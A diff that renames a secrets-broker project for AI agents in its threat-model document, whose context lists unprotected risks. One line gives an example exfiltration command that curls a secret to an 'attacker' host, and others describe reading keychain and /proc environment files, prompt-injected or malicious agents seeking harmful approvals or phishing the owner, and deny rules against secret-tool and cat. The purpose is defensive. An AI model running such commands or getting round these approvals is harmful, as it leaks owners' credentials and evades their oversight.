@@ -1,4 +1,4 @@
-# Threat model — blindkey
+# Threat model — veilform
 
 > Status: MVP (0.1.0). This document is deliberately honest about what is **not** protected.
 
@@ -72,7 +72,7 @@ Removes the value and common variants: raw, trimmed, JSON-escaped (single and do
 Everything the model can target is declared by the owner in `config.json`: destinations, SSH hosts, write targets (globs on path/keys/repo/unit), HTTP hosts, databases + tables + columns, web sites + origins. HTTPS is mandatory for remote stores and HTTP actions (plain HTTP only on loopback when explicitly enabled for tests).
 
 ### 4.8 Audit
-Append-only JSONL with a SHA-256 hash chain (`prev` field); `blindkey verify-audit` detects edits/truncation in the middle. Each entry records session id, agent label (`BLINDKEY_AGENT`), MCP client name/version, action, fingerprint, names — never values.
+Append-only JSONL with a SHA-256 hash chain (`prev` field); `veilform verify-audit` detects edits/truncation in the middle. Each entry records session id, agent label (`VEILFORM_AGENT`), MCP client name/version, action, fingerprint, names — never values.
 
 ## 5. Specific risk: fetching secrets from remote stores by API
 
@@ -88,7 +88,7 @@ Append-only JSONL with a SHA-256 hash chain (`prev` field); `blindkey verify-aud
 
 1. **An approved action that exfiltrates or transforms the value.** If the owner approves `curl https://attacker/?k=${secret:X}`, or a script that encrypts/reverses/splits the value before printing it, the redactor cannot help. This is why approval pages show the literal action and warn on shells, interpreters and network/encoding tools. Read before you click; do not "remember" shell scripts you do not fully understand.
 2. **A malicious or prompt-injected model asking to approve something harmful.** The approval page is the control; social engineering of the owner is out of scope. Keep "remember" for narrow, boring actions.
-3. **Same-user local malware or an agent with unrestricted shell.** Anything running as the same OS user can read the keychain (`secret-tool lookup …`), the encrypted file + key, the `.env` files we write, `/proc/<pid>/environ` of children, and can edit `approvals.json`. If your agent also has an unrestricted Bash tool, it can do the same. Mitigations: restrict the agent's shell (Claude Code permission rules: deny `secret-tool`, `security`, `cat`/`Read` on `~/.config/blindkey/**` and on the `.env` files you deploy), run the agent sandboxed or as another user.
+3. **Same-user local malware or an agent with unrestricted shell.** Anything running as the same OS user can read the keychain (`secret-tool lookup …`), the encrypted file + key, the `.env` files we write, `/proc/<pid>/environ` of children, and can edit `approvals.json`. If your agent also has an unrestricted Bash tool, it can do the same. Mitigations: restrict the agent's shell (Claude Code permission rules: deny `secret-tool`, `security`, `cat`/`Read` on `~/.config/veilform/**` and on the `.env` files you deploy), run the agent sandboxed or as another user.
 4. **Values legitimately present in the child's environment.** `exec` puts values in the child's env; in shell mode the shell may put them in grandchildren's argv (e.g. `curl -H "…$TOKEN"`), visible to same-user `ps` during execution.
 5. **XSS in the local page.** We render untrusted strings with `textContent` and a nonce CSP, but a browser bug or a future code change could break this. A malicious browser extension can read anything typed in any page.
 6. **Phishing look-alike.** A malicious agent could show the owner a URL to a fake page that looks like ours. Always check the address is `http://127.0.0.1:<port>/p/…`; the page shows the request id that also appears in the chat.
@@ -107,4 +107,4 @@ Append-only JSONL with a SHA-256 hash chain (`prev` field); `blindkey verify-aud
 - Use the keychain or `encrypted-file` with a keychain-held key; avoid `env`-passphrases in `claude mcp add -e` (they end up in the client's config file).
 - Scope remote-store tokens narrowly; rotate (`secret_rotate`, `rotate_after_days`).
 - Review `approvals.json` periodically; delete entries to force re-approval.
-- Run `blindkey verify-audit` in your backups.
+- Run `veilform verify-audit` in your backups.
